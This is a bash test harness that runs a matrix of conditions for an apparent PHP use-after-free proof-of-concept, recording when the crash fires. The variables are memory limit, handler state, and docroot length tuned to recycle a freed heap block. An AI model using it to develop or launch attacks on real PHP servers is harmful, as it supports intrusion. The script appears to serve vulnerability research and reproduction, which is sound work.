#!/usr/bin/env bash
# Control matrix. Each row = one fresh worker, arm + fire, report verdict.
# A row should only abort when the handler is ON, the arm actually exhausted
# memory_limit, AND the freed 64-byte context got recycled (docroot 22..29).
set -u
cd "$(dirname "$0")"
row() {
  local label=$1 mem=$2 handler=$3 port=$4 docroot=${5:-}
  printf '%-40s ' "$label"
  out=$(python3 poc.py --port "$port" --mem-limit "$mem" --handler "$handler" \
        --workdir "/tmp/phpuaf-m-$port" ${docroot:+--docroot "$docroot"} 2>&1)
  printf '%s | %s\n' \
    "$(printf '%s\n' "$out" | sed -n 's/^VERDICT *: FIRED.*/FIRED/p; s/^VERDICT *: no abort.*/survived/p')" \
    "$(printf '%s\n' "$out" | sed -n 's/^R1 arm *: //p')"
}

row "handler ON,  mem 8M, tuned docroot"      8M  1 9501
row "handler ON,  mem 8M, tuned docroot (2)"  8M  1 9502
row "handler OFF, mem 8M, tuned docroot"      8M  0 9503
row "handler ON,  mem 64M (arm cannot OOM)"   64M 1 9504
row "handler ON,  mem 1G  (arm cannot OOM)"   1G  1 9505
row "handler ON,  mem 8M, docroot len 39"     8M  1 9506 /tmp/phpuaf-m-9506/fffffffffffffffff

echo
echo "only handler-ON + real OOM + recycled-context rows abort."
echo "handler off  -> arm still OOMs, no orphaned serialize state, survives."
echo "mem 64M/1G   -> arm never OOMs, no orphaned state, survives."
echo "long docroot -> same UAF, block recycled by another bin, survives."
